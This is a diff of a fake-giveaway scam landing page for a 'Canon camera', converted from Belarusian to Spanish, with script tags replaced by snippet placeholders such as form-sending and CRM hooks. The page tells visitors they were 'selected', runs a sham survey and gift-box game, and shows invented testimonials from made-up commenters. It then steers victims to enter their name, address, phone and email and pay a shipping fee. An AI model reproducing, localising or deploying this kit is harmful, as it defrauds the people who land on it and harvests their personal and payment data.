@@ -4,7 +4,7 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="robots" content="noindex, follow">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>ВІНШУЕМ!</title>
+  <title>¡FELICITACIONES!</title>
   <meta name="theme-color" content="#0096e7">
   <link rel="icon" type="image/gif" href="assets/favicon.ico">
   <link rel="stylesheet" href="assets/slick.min.css">
@@ -14,22 +14,17 @@
   <link rel="stylesheet" href="assets/sur.min.css">
   <link rel="stylesheet" href="assets/index.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
-  <script src="assets/bootstrap.min.js"></script>
-  <script>
-    let currentDay = ['Dimanche', 'Lundi', 'Mardi', 'Mercredi', 'Jeudi', 'Vendredi', 'Samedi'];
-    let currentMonth = ['Janvier', 'Février', 'Mars', 'Avril', 'Mai', 'Juin', 'Juillet', 'Août', 'Septembre', 'Octobre', 'Novembre', 'Décembre'];
-    let minuteText = 'minutes et ';
-    let secondsText = 'secondes';
-    /* ------------- */
-    let settingModal = {backdrop: 'static', keyboard: false};
-    let productName = 'Appareil photo Canon';
-    let suffix = '';
-  </script>
-</head>
-<body>
-<script src="../snippets/fbpixel.js"></script>
-<script src="../snippets/common_js_no_depth_snippet.js"></script>
+</head><body>{snippet:jquery_cdn}
+<script src="assets/bootstrap.min.js"></script>
+<script>
+  let settingModal = { backdrop: 'static', keyboard: false };
+  let productName = 'Cámara Canon\'';
+</script>
+{snippet:hue_n_title_changer}
+
+
+
+{snippet:common_js_no_depth_snippet}{snippet:fbpixel}
 <div id="p_loading" style="display:none">
   <div class="d-flex justify-content-center" style="margin:0 auto">
     <div class="spinner-border" role="status"><span class="sr-only">Loading...</span></div>
@@ -97,8 +92,8 @@
   <div class="content">
     <div class="all-content-wrapper">
       <div class="main-content flags home-step" id="content1">
-        <h2 style="font-weight:300">ВІНШУЕМ!</h2>
-        <p>Сёння, <span class="p_var-dia">{DAY}</span></p>
+        <h2 style="font-weight:300">¡FELICITACIONES!</h2>
+        <p>Has sido seleccionado para participar en la campaña Canon. ¡Podrías ganar un Cámara Canon'!</p>
         <div class="caja_premio" style="max-width:100%;margin:0 auto">
           <style>
             .principal_bg {
@@ -117,53 +112,39 @@
             </div>
           </div>
         </div>
-        <p>Кожныя <span class="p_var-dia_nombre">{DAY__OF_WEEK}</span> мы выбіраем 10 выпадковых карыстальнікаў і
-          дайце ім шанец выйграць цудоўныя прызы. Сённяшні прыз - фотаапарат Canon! Ёсць
-          будзе мець 10 шчасліўчыкаў.</p>
-        <p>Гэта апытанне накіравана на паляпшэнне паслуг, прапанаваных нашым карыстальнікам.</p>
-        <p>У вас ёсць толькі <font color="red"><b></b></font></p>
-        <p>Спяшайцеся, колькасць прызоў абмежавана!</p>
+        <p>Si quieres un Cámara Canon', tendrás que completar una encuesta para confirmar que eres una persona real.
+        </p>
+        <p>¡Date prisa, la cantidad de bolsos es limitada!</p>
         <div class="main-content flags" id="content1">
           <div id="q1">
-            <p class="question"><strong>Пытанне 1 з 4</strong>&nbsp;<span>Вы мужчына ці жанчына!</span>
+            <p class="question"><strong>Pregunta 1 de 3</strong>&nbsp;<span>¿Eres de España?</span>
             </p>
-            <div class="survey_button bq1" data-depth="depth" data-bq="1">мужчынскі</div>
-            <div class="survey_button bq1" data-depth="depth" data-bq="2">жанчыны</div>
+            <div class="survey_button bq1" data-depth="depth" data-bq="1">SÍ</div>
+            <div class="survey_button bq1" data-depth="depth" data-bq="2">NO</div>
           </div>
           <div id="q2">
-            <p class="question"><strong>Пытанне 2 з 4</strong>&nbsp;<span>Колькі табе гадоў!</span></p>
-            <div class="survey_button bq2" data-depth="depth" data-bq="1">18-29</div>
-            <div class="survey_button bq2" data-depth="depth" data-bq="2">30-39</div>
-            <div class="survey_button bq2" data-depth="depth" data-bq="3">40-49</div>
-            <div class="survey_button bq2" data-depth="depth" data-bq="4">50</div>
+            <p class="question"><strong>Pregunta 2 de 3</strong>&nbsp;<span>¿Has comprado algo de Canon?</span></p>
+            <div class="survey_button bq2" data-depth="depth" data-bq="1">SÍ</div>
+            <div class="survey_button bq2" data-depth="depth" data-bq="2">NO</div>
           </div>
           <div id="q3">
-            <p class="question"><strong>Пытанне 3 з 4</strong>&nbsp;<span>Колькі членаў у вашай сям'і!
-                  толькі)</span>
+            <p class="question"><strong>Pregunta 3 de 3</strong>&nbsp;<span>¿Quieres participar en el sorteo por un
+                  Cámara Canon'?</span>
             </p>
-            <div class="survey_button bq3" data-depth="depth" data-bq="1">Адзін (Адзін)</div>
-            <div class="survey_button bq3" data-depth="depth" data-bq="2">1</div>
-            <div class="survey_button bq3" data-depth="depth" data-bq="3">2</div>
-            <div class="survey_button bq3" data-depth="depth" data-bq="4">3</div>
-          </div>
-          <div id="q4">
-            <p class="question"><strong>Пытанне 4 з 4:</strong>&nbsp;<span>Вы калі-небудзь куплялі што-небудзь у
-                  Гармата?</span>
-            </p>
-            <div class="survey_button bq4" data-depth="depth" data-bq="1">так</div>
-            <div class="survey_button bq4" data-depth="depth" data-bq="2">няма</div>
+            <div class="survey_button bq3" data-depth="depth" data-bq="3">SÍ</div>
+            <div class="survey_button bq3" data-depth="depth" data-bq="4">NO</div>
           </div>
         </div>
         <link rel="stylesheet" href="assets/survey.min.css">
       </div>
       <div class="main-content" id="content2">
-        <h2 style="text-align:center">Мы правяраем вашы адказы...</h2>
+        <h2 style="text-align:center">TUS RESPUESTAS ESTÁN SIENDO REVISADAS...</h2>
         <div class="d-flex justify-content-center">
           <div class="spinner-border m-3" role="status"><span class="sr-only">Loading...</span></div>
         </div>
-        <p class="result" id="result1">Вы адказалі на 4 з 4 пытанняў</p>
-        <p class="result" id="result2">Папярэдніх расследаванняў па вашым IP няма</p>
-        <p class="result" id="result3">Ідзе загрузка падарункаў...</p>
+        <p class="result" id="result1">¡Has respondido 3/3 de las preguntas!</p>
+        <p class="result" id="result2">No hay investigaciones preliminares sobre tu IP</p>
+        <p class="result" id="result3">Los regalos están cargados...</p>
       </div>
       <div class="main-content" id="content3">
         <link rel="stylesheet" href="assets/box.min.css">
@@ -288,10 +269,8 @@
           <div class="modal-dialog" role="document">
             <div class="modal-content">
               <div class="modal-body"><img alt="" class="temblor_inf box-00" src="assets/31.webp">
-                <h2>ВІНШУЕМ, МЫ ПРАВЕРЫЛІ ВАШЫЯ АДКАЗЫ.</h2>
-                <p><strong><span class="p_var-dia_nombre">нядзеля</span>, <span class="p_var-dia">{DAY}</span></strong></p>
-                <p>У вас ёсць шанец выйграць адзін з нашых прызоў.</p>
-                <p>Паспрабуйце ўдачу!</p>
+                <h2>FELICITACIONES, HAS COMPROBADO CON ÉXITO QUE ERES UNA PERSONA REAL.</h2>
+                <p>¡Hoy tienes la oportunidad de conseguir un Cámara Canon'!</p>
                 <button type="button" id="p_modal_button1" class="btn btn-success btn-lg" style="background-color:var(--btn-color);border-color:var(--btn-color)">OK
                 </button>
               </div>
@@ -306,7 +285,8 @@
                   <div class="checkmark draw"></div>
                 </div>
                 <h2>OHHH…</h2>
-                <p>У вас ёсць дадатковы ход!</p>
+                <p>¡Lo sentimos, esta caja de regalo está vacía! Pero puedes volver a intentarlo dos veces más. ¡Buena
+                  suerte!</p>
                 <button type="button" id="p_modal_button2" class="btn btn-success btn-lg" style="background-color:var(--btn-color);border-color:var(--btn-color)">OK
                 </button>
               </div>
@@ -317,14 +297,12 @@
           <div class="modal-dialog" role="document">
             <div class="modal-content">
               <div class="modal-body"><img alt="" class="box-gift" src="assets/3.webp">
-                <h2>ВІНШУЕМ!</h2>
-                <p>ВІНШУЕМ! Вы выйгралі камеру Canon!</p>
-                <p>***ПРАВІЛЫ***</p>
-                <p>1. Націсніце "ОК", каб запоўніць свае дадзеныя на старонцы аплаты.</p>
-                <p>2. Увядзіце свой адрас, каб атрымаць камеру Canon.</p>
-                <p>3. Камера Canon будзе дастаўлена на працягу 5-7 дзён.</p>
-                <button id="p_modal_button3" class="btn btn-success btn-lg" style="background-color:var(--btn-color);border-color:var(--btn-color);color:#fff">Ўжываць
-                  ЗАРАЗ</button>
+                <h2>¡FELICITACIONES! ¡HAS GANADO!</h2>
+                <p>1) Haz clic en "Solicitar ahora".</p>
+                <p>2) Completa el formulario y paga por el envío.</p>
+                <p>3) El paquete será entregado en el plazo de 5-7 días.</p>
+                <button id="p_modal_button3" class="btn btn-success btn-lg" style="background-color:var(--btn-color);border-color:var(--btn-color);color:#fff">Solicitar
+                  ahora</button>
               </div>
             </div>
           </div>
@@ -336,9 +314,9 @@
             <div class="row justify-content-between align-items-center">
               <div class="col-12 col-xl-8">
                 <div class="intro-offer">
-                  <div class="intro-offer__name">{ITEM}</div>
-                  <div class="intro-offer__review"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><span>5,0 (12
-                        аглядi)</span></div>
+                  <div class="intro-offer__name">Cámara Canon'</div>
+                  <div class="intro-offer__review"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><span>5.0 (12
+                        reseñas)</span></div>
                 </div>
                 <div class="intro-img">
                   <div style="padding-bottom:7px;margin-bottom:15px" class="intro-img__btn buttons_showHidden">
@@ -348,9 +326,9 @@
                   </div>
                   <div class="intro-img__img intro-img__img-end images_showHidden"><img src="assets/3.webp" alt="" class="active" data-step="0"><img src="assets/set2.webp" alt="" data-step="1"><img src="assets/set3.webp" alt="" data-step="2"></div>
                   <div class="intro-img__title" style="display:none">
-                    <h2 class="active" data-step="0">{ITEM}</h2>
-                    <h2 data-step="1">{ITEM}</h2>
-                    <h2 data-step="2">{ITEM}</h2>
+                    <h2 class="active" data-step="0">Cámara Canon'</h2>
+                    <h2 data-step="1">Cámara Canon'</h2>
+                    <h2 data-step="2">Cámara Canon'</h2>
                   </div>
                 </div>
               </div>
@@ -360,63 +338,63 @@
                     <form class="new-form" id="userDataForm" action="" method="POST">
                       <div class="form-block" data-step="0" style="display:block">
                         <div class="input-wrapper StepForm">
-                          <p class="form-title">Калі ласка, увядзіце свае дадзеныя</p>
+                          <p class="form-title">Ingresa tus datos</p>
                           <div class="form-block__half m-0">
                             <div id="firstnameWrapper" class="form-block__full"><i class="far fa-check-circle"></i>
-                              <input data-depth="depth" data-validate="name" class="w100" placeholder="First name" id="firstname" name="fname" autocomplete="given-name"> <span class="placeholder firstname">Імя</span>
+                              <input data-depth="depth" data-validate="name" class="w100" placeholder="First name" id="firstname" name="fname" autocomplete="given-name"> <span class="placeholder firstname">Nombre</span>
                             </div>
-                            <div id="firstnameInvalid" class="invalidField">* Імя несапраўднае (напрыклад, Vincent)</div>
+                            <div id="firstnameInvalid" class="invalidField">* El nombre no es válido (p. ej., Vincent)
+                            </div>
                           </div>
                           <div class="form-block__half m-0">
                             <div id="lastnameWrapper" class="form-block__full"><i class="far fa-check-circle"></i>
-                              <input data-validate="name" class="w100" placeholder="Last name" id="lastname" name="lname" autocomplete="family-name"> <span class="placeholder lastname">Імя
-                                  сям'я</span>
+                              <input data-validate="name" class="w100" placeholder="Last name" id="lastname" name="lname" autocomplete="family-name"> <span class="placeholder lastname">Apellido</span>
                             </div>
-                            <div id="lastnameInvalid" class="invalidField">* Прозвішча несапраўднае (напр.
-                              Ламберт)</div>
+                            <div id="lastnameInvalid" class="invalidField">* El apellido no es válido (p. ej.,
+                              Lambert)</div>
                           </div>
                           <div id="addressWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input data-validate="address" class="w100" placeholder="Address" id="address" name="address" autocomplete="street-address">
-                            <span class="placeholder address">Адрас</span>
+                            <span class="placeholder address">Dirección</span>
                           </div>
                           <div class="form-block__half m-0">
                             <div id="zipcodeWrapper" class="form-block__full"><i class="far fa-check-circle"></i>
                               <input data-validate="zip" class="w100" placeholder="ZIP" id="zipcode" name="zip" autocomplete="postal-code">
-                              <span class="placeholder zipcode">Паштовы індэкс</span>
+                              <span class="placeholder zipcode">Código postal</span>
                             </div>
                           </div>
                           <div class="form-block__half m-0">
                             <div id="cityWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input data-validate="city" class="w100" placeholder="City" id="city" name="city" autocomplete="address-level2">
-                              <span class="placeholder city">Горад</span>
+                              <span class="placeholder city">Ciudad</span>
                             </div>
                           </div>
                           <div id="phoneWrapper" class="form-block__full focused"><i class="far fa-check-circle"></i>
                             <input data-validate="phone" class="w100" placeholder="Phone" id="phone" name="phone" autocomplete="tel-national">
-                            <span class="placeholder phone">Нумар тэлефона</span>
+                            <span class="placeholder phone">Número de teléfono</span>
                             <div class="plus_number_code">+</div>
                             <div class="flag iti-flag"></div>
                           </div>
-                          <div id="phoneInvalid" class="invalidField">* Нумар тэлефона несапраўдны (напр.
-                            11234567890)</div>
-                          <div id="emailWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input data-validate="email" class="w100" placeholder="Email" id="email" name="email" autocomplete="off"> <span class="placeholder email">Электронная пошта</span>
+                          <div id="phoneInvalid" class="invalidField">* El teléfono no es válido (p. ej.,
+                            +11234567890)</div>
+                          <div id="emailWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input data-validate="email" class="w100" placeholder="Email" id="email" name="email" autocomplete="off"> <span class="placeholder email">Correo electrónico</span>
                             <ul class="email-hint">
-                              <li class="email" data-value="gmail.com">Электронная пошта</li>
-                              <li class="email" data-value="outlook.com">Электронная пошта</li>
-                              <li class="email" data-value="live.com">Электронная пошта</li>
-                              <li class="email" data-value="orange.com">Электронная пошта</li>
-                              <li class="email" data-value="gmail.com">Электронная пошта</li>
-                              <li class="email" data-value="hotmail.com">Электронная пошта</li>
-                              <li class="email" data-value="live.com">Электронная пошта</li>
-                              <li class="email" data-value="sfr.com">Электронная пошта</li>
-                              <li class="email" data-value="yahoo.com">Электронная пошта</li>
-                              <li class="email" data-value="gmx.com">Электронная пошта</li>
-                              <li class="email" data-value="wanadoo.com">Электронная пошта</li>
-                              <li class="email" data-value="neuf.com">Электронная пошта</li>
-                              <li class="email" data-value="free.com">Электронная пошта</li>
+                              <li class="email" data-value="gmail.com">Correo electrónico</li>
+                              <li class="email" data-value="outlook.com">Correo electrónico</li>
+                              <li class="email" data-value="live.com">Correo electrónico</li>
+                              <li class="email" data-value="orange.com">Correo electrónico</li>
+                              <li class="email" data-value="gmail.com">Correo electrónico</li>
+                              <li class="email" data-value="hotmail.com">Correo electrónico</li>
+                              <li class="email" data-value="live.com">Correo electrónico</li>
+                              <li class="email" data-value="sfr.com">Correo electrónico</li>
+                              <li class="email" data-value="yahoo.com">Correo electrónico</li>
+                              <li class="email" data-value="gmx.com">Correo electrónico</li>
+                              <li class="email" data-value="wanadoo.com">Correo electrónico</li>
+                              <li class="email" data-value="neuf.com">Correo electrónico</li>
+                              <li class="email" data-value="free.com">Correo electrónico</li>
                             </ul>
                           </div>
-                          <div id="emailInvalid" class="invalidField">* Адрас электроннай пошты несапраўдны (напрыклад
-                            муж@gmail.com)</div>
-                          <button data-depth="depth" id="submitForm" type="submit" class="info-button" data-call="_generateFullName" data-next="1">Працягнуць</button>
+                          <div id="emailInvalid" class="invalidField">* El correo electrónico no es válido (p. ej.,
+                            husband@gmail.com)</div>
+                          <button data-depth="depth" id="submitForm" type="submit" class="info-button" data-call="_generateFullName" data-next="1">Continuar</button>
                         </div>
                       </div>
                     </form>
@@ -466,113 +444,113 @@
         <link rel="stylesheet" href="assets/comments.min.css">
         <div class="comments_face">
           <div class="comments">
-            <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998">больш
-                  опцыі</span></p>
-            <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">Ад 10 да 80</p>
+            <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998">Más
+                  opciones</span></p>
+            <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">10 a 80
+            </p>
             <div style="clear:both"></div>
           </div>
           <div class="comments" id="comment0" style="display:block">
             <div class="profile"><img src="assets/i-14.webp" style="height:60px"></div>
             <div class="comment-content">
               <p class="name">Sallie Hull</p>
-              <p>Шкада, я нічога не выйграў!</p>
+              <p>¡Joder, no he ganado nada!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">4 хвіліны таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 4 minutos</u></small></div>
           </div>
           <div class="comments" id="comment1" style="display:block">
             <div class="profile"><img src="assets/i-22.webp"></div>
             <div class="comment-content">
               <p class="name">Marvin Allen</p>
-              <p>Мне падабаюцца гэтыя акцыі!</p>
+              <p>¡Me gustan estas promociones!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">11 хвілін таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 11 minutos</u></small></div>
           </div>
           <div class="comments" id="comment1" style="display:block">
             <div class="profile"><img src="assets/i-11.webp"></div>
             <div class="comment-content">
               <p class="name">Casey Daniels</p>
-              <p>Сёння я атрымаў камеру. Вялікі дзякуй!</p>
+              <p>Hoy he recibido mi Cámara Canon'. ¡Muchas gracias!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">15 хвілін таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 15 minutos</u></small></div>
           </div>
           <div class="comments" id="comment2" style="display:block">
             <div class="profile"><img src="assets/i-21.webp"></div>
             <div class="comment-content">
               <p class="name">Walter Hoffman</p>
-              <p>Я думаў, што гэта жарт, але мая камера прыбыла сёння раніцай!</p>
+              <p>¡Pensé que era una broma, pero mi cámara llegó esta mañana!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">38 хвілін таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 38 minutos</u></small></div>
           </div>
           <div class="comments" id="comment3" style="display:block">
             <div class="profile"><img src="assets/15.webp"></div>
             <div class="comment-content">
               <p class="name">Florence Cleek</p>
-              <p>Я ўдзельнічаў, выйграў і атрымаў камеру Canon праз 5 дзён. Вялікі дзякуй
-                хлопцы!</p>
+              <p>Participé, gané y recibí mi cámara a los 5 días. ¡Muchas gracias, muchachos!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">42 хвіліны таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 42 minutos</u></small></div>
           </div>
           <div class="comments" id="comment4" style="display:block">
             <div class="profile"><img src="assets/i-12.webp"></div>
             <div class="comment-content">
               <p class="name">Amalia Falchi</p>
-              <p>Ці магу я атрымаць сваю камеру Canon сёння? ДЗЯКУЙ</p>
+              <p>¿Puedo recibir mi Cámara Canon' hoy? Gracias</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">1 гадзіну таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 1 hora</u></small></div>
           </div>
           <div class="comments" id="comment5" style="display:block">
             <div class="profile"><img src="assets/i-16.webp"></div>
             <div class="comment-content">
               <p class="name">Margaret McNutt</p>
-              <p>Я думаў, што гэта жарт, але сёння раніцай я атрымаў сваю камеру Canon праз DHL
-                і я хацеў бы паўдзельнічаць у іншых апытаннях!</p>
+              <p>Pensé que era una broma, pero esta mañana recibí mi Cámara Canon' a través de DHL ¡y me gustaría
+                hacer más encuestas!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">2 гадзіны таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 2 hora</u></small></div>
           </div>
           <div class="comments" id="comment5" style="display:block">
             <div class="profile"><img src="assets/i-23.webp"></div>
             <div class="comment-content">
               <p class="name">James Young</p>
-              <p>Ці трэба праводзіць якія-небудзь іншыя расследаванні?</p>
+              <p>¿Hay otras encuestas para completar?</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">2 гадзіны таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 2 hora</u></small></div>
           </div>
           <div class="comments" id="comment6" style="display:block">
             <div class="profile"><img src="assets/i-24.webp"></div>
             <div class="comment-content">
               <p class="name">Stephen Hall</p>
-              <p>Фантастычны! Я ніколі раней нічога не выйграваў!</p>
+              <p>¡Fantástico! ¡Nunca antes había ganado nada!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">3 гадзіны таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 3 hora</u></small></div>
           </div>
           <div class="comments" id="comment7" style="display:block">
             <div class="profile"><img src="assets/i-13.webp"></div>
             <div class="comment-content">
               <p class="name">Tina Williams</p>
-              <p>Спачатку я падумаў, што гэта жарт, але нарэшце атрымаў камеру. Я гаварыў са сваімі
-                сяброў, каб яны таксама маглі прынесці карысць.</p>
+              <p>Al principio pensé que era una broma, pero finalmente obtuve mi cámara. Les conté a mis amigos al
+                respecto, para que ellos también puedan conseguir los suyos.</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>Mi piace • Каментарый <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">4 гадзіны таму</u></small></div>
+            <div class="comment-status"><span>Me gusta • Comentario <img alt="" style="margin-top:-4px" src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px" height="15px">{LIKES}&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">Hace 4 hora</u></small></div>
           </div>
         </div>
       </div>
@@ -582,12 +560,12 @@
 <link rel="stylesheet" href="assets/index-form.css">
 <link rel="stylesheet" href="assets/intlTelInput.min.css">
 <link rel="stylesheet" href="assets/header.css">
-<script src="../snippets/p_min_js_snippet.js"></script>
-<script src="../snippets/slider_snippet.js"></script>
-<script src="../snippets/validate_form_snippet.js"></script>
-<script src="../snippets/set_country_snippet.js"></script>
-<script src="../snippets/api_form_send.js"></script>
-<script src="../snippets/api_form_crm.js"></script>
-undefined
+{snippet:p_min_js_snippet}
+{snippet:slider_snippet}
+{snippet:validate_form_snippet}
+{snippet:set_country_snippet}
+{snippet:api_form_send}
+{snippet:api_form_crm}
+
 
 </body></html>
